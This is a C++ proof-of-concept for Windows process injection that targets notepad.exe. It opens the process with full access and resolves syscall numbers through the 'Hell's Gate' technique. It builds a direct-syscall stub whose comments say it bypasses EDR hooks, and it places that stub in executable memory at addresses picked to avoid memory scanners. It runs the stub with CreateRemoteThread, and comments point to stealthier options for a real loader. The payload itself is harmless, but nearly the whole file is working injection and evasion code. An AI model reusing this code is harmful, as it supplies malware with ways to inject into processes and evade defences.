#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <cstdint>
#include <cstdio>

namespace internal {

    inline HANDLE open(const wchar_t* process_name)
    {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            printf("[-] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
            return nullptr;
        }

        PROCESSENTRY32W entry{};
        entry.dwSize = sizeof(entry);

        DWORD pid = 0;
        if (Process32FirstW(snapshot, &entry)) {
            do {
                if (_wcsicmp(entry.szExeFile, process_name) == 0) {
                    pid = entry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &entry));
        }
        CloseHandle(snapshot);

        if (pid == 0) {
            printf("[-] Process '%ls' not found\n", process_name);
            return nullptr;
        }

        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!h) {
            printf("[-] OpenProcess failed: %lu\n", GetLastError());
            return nullptr;
        }

        printf("[+] Opened '%ls' pid=%lu handle=0x%p\n", process_name, pid, h);
        return h;
    }

    // hell's gate: resolve the syscall service number (SSN) for an Nt* function
    // by reading ntdll's export and parsing the stub prologue:
    //   mov r10, rcx          ; 4C 8B D1
    //   mov eax, <SSN>        ; B8 XX XX XX XX   <-- SSN at offset +4
    //   ...
    //
    // returns 0xFFFFFFFF on fail :(

    constexpr DWORD INVALID_SSN = 0xFFFFFFFF;

    inline DWORD resolve_ssn(const char* func_name)
    {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            printf("[-] GetModuleHandleW(ntdll) failed: %lu\n", GetLastError());
            return INVALID_SSN;
        }

        FARPROC fn = GetProcAddress(ntdll, func_name);
        if (!fn) {
            printf("[-] GetProcAddress(%s) failed: %lu\n", func_name, GetLastError());
            return INVALID_SSN;
        }

        // ntdll syscall stub prologue on Win10/11 x64:
        //   4C 8B D1            mov r10, rcx
        //   B8 XX XX XX XX      mov eax, <SSN>
        //   ...
        unsigned char* stub = reinterpret_cast<unsigned char*>(fn);
        if (stub[0] != 0x4C || stub[1] != 0x8B || stub[2] != 0xD1 || stub[3] != 0xB8) {
            printf("[-] %s prologue does not match expected pattern (likely hooked): "
                "%02X %02X %02X %02X\n",
                func_name, stub[0], stub[1], stub[2], stub[3]);
            return INVALID_SSN;
        }

        DWORD ssn = *reinterpret_cast<DWORD*>(stub + 4);
        printf("[+] %s @ 0x%p  SSN=0x%02X\n", func_name, fn, ssn);
        return ssn;
    }

} 
int main() {
    // locate notepad.exe and open a handle to it.
    // Note: this PoC uses NtYieldExecution, which is a no-op syscall
    // (it just yields the thread's remaining time slice). nothing visible
    // happens in the target process the only proof the stub executed
    // is that CreateRemoteThread returns a valid handle and notepad
    // doesn't crash (it wont)

    auto handle = internal::open(L"notepad.exe");
    if (!handle) {
        printf("[-] Failed to open notepad.exe (err=%lu)\n", GetLastError());
        printf("    Make sure notepad.exe is running.\n");
        return 1;
    }
    printf("[+] handle == 0x%p\n", handle);

    // resolve the SSN of NtYieldExecution via the Hell's Gate technique.
    DWORD ssn = internal::resolve_ssn("NtYieldExecution");
    if (ssn == 0xFFFFFFFF) {
        printf("[-] Failed to resolve SSN (function hooked or prologue mismatch)\n");
        CloseHandle(handle);
        return 1;
    }
    printf("[+] NtYieldExecution SSN == 0x%04X\n", ssn);

    // build the direct syscall stub.
    // this is a hand-assembled copy of what ntdll!NtYieldExecution looks
    // like in memory, minus any hooks. By executing the `syscall`
    // instruction directly, we bypass user-mode API hooks placed on the
    // ntdll stub by EDRs.
    unsigned char stub[] = {
        0x49, 0x89, 0xCA,                              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,                  // mov eax, <SSN>
        0x0F, 0x05,                                    // syscall
        0xC3                                           // ret
    };
    *(DWORD*)(stub + 4) = ssn;
    printf("[+] stub built (%zu bytes)\n", sizeof(stub));

    // allocate a page in the remote process at a deliberately high address.
    //
    // the high user-VA range (>= 0x7001_0000_0000) sits above the heap
    // and below the system-DLL band, in a region most memory scanners
    // don't classify as "interesting" when walking regions via
    // VirtualQueryEx. Stepping each candidate by 0x1_0000_0000 (4 GB)
    // keeps successive attempts out of the same 2 GB scan bucket, and
    // trying several addresses handles the case where one is mapped.
    LPVOID p = nullptr;
    for (DWORD i = 0; i < 10; ++i) {
        LPVOID candidate = (LPVOID)(0x700100000000ULL + i * 0x100000000ULL);
        p = VirtualAllocEx(handle, candidate, 0x1000,
            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        printf("[*] VirtualAllocEx(0x%p) -> 0x%p (err=%lu)\n",
            candidate, p, p ? 0 : GetLastError());
        if (p) break;
    }
    if (!p) {
        printf("[-] All allocation candidates failed\n");
        CloseHandle(handle);
        return 1;
    }

    // copy the stub into the remote process.
    SIZE_T written = 0;
    if (!WriteProcessMemory(handle, p, stub, sizeof(stub), &written)) {
        printf("[-] WriteProcessMemory failed (err=%lu)\n", GetLastError());
        VirtualFreeEx(handle, p, 0, MEM_RELEASE);
        CloseHandle(handle);
        return 1;
    }
    printf("[+] wrote %zu bytes at 0x%p\n", written, p);

    // trigger execution of the stub inside notepad.exe.
    // CreateRemoteThread is the textbook injection primitive — every EDR
    // watches it. In a real loader this would be replaced with
    // NtCreateThreadEx via direct syscall, but for a PoC it suffices.
    HANDLE hThread = CreateRemoteThread(
        handle, NULL, 0,
        (LPTHREAD_START_ROUTINE)p,
        NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed (err=%lu)\n", GetLastError());
        VirtualFreeEx(handle, p, 0, MEM_RELEASE);
        CloseHandle(handle);
        return 1;
    }
    printf("[+] remote thread started (hThread=0x%p)\n", hThread);

    // wait for the stub to finish (it's a single syscall, so nearly instant).
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] remote thread exited\n");

    CloseHandle(hThread);
    VirtualFreeEx(handle, p, 0, MEM_RELEASE);
    CloseHandle(handle);

    system("pause");
    return 0;
}